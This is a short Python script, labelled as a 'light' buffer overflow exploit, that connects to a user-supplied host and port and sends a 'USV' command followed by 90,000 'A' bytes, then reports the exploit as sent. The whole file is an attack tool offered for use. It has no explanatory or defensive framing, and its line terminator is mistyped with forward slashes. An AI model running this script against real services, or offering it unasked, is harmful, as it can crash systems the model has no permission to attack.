#!/usr/bin/env python3
# -*- coding: utf-8 -*

import argparse 
import socket
import sys
import os

print ("                                                                                                                           ")
print ("#             SCRIPT : BUFFER OVERFLOW [light]                                           #") 
print ("#             AUTOR : MRX with contributions from some friendly hackers                  #")
print ("")                      


def sender(host, port):
    try:
        buffer = b"\x41" * 90000
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.send(b"USV " + buffer + b"//r//n//r")
        s.close()
        print ("BUFFER_EXPLOIT enviado com sucesso!\n")
    except KeyboardInterrupt:
         print ('Exiting...\n')

if __name__ == '__main__':
    carg = argparse.ArgumentParser(description='Buffer overflow, light thing', epilog='Use me, but be carefull')



    carg.add_argument('-d', '--host', type=str, help='Host to send the buffer', required=True)
    carg.add_argument('-p', '--port', type=int, help='Port to send the buffer', required=True)
    args = carg.parse_args()

    
    host_ip = args.host
    host_port = args.port

    sender(host_ip, host_port)
    sys.exit(0)
